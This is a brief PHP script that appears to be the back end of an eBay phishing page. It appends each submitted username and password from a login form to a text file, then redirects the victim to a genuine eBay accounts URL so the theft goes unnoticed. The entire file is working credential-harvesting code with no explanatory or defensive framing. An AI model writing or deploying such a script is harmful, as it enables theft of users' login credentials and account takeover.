<?php

    file_put_contents("usernames.txt", "Username: " . $_POST['userid'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.ebay.com/acctxs/user');
exit();
